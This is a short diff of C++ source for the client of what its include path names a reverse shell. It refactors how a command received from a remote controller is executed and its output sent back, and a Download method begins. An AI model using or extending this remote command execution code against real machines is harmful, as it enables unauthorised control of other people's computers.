@@ -13,7 +13,7 @@
 #include <filesystem>
 #include <boost/algorithm/string.hpp>
 #include <unordered_map>
-#include "CommandExecuter.hpp"
+#include "CommandExecuter.h"
 #include "../CommonReverseShell/Functions.hpp"
 
 class Client
@@ -63,10 +63,16 @@ private:
 	{
 		auto command = m_ShellUtils.Response();
 		std::cout << "Command to Run: " << command << std::endl;
-		CommandExecuter commandExecuter;
-		auto commandResult = *commandExecuter.RunCommand(command);
+		auto commandResult = RunShellCommand(command);
 		std::cout << "Command Result: " << commandResult << std::endl;
 		m_ShellUtils.Send(commandResult);
+	}
+
+	std::string RunShellCommand(const std::string& command)
+	{
+		CommandExecuter commandExecuter;
+		auto commandResult = commandExecuter.RunShellCommand(command);
+		return std::move(commandResult);
 	}
 
 	void Download()
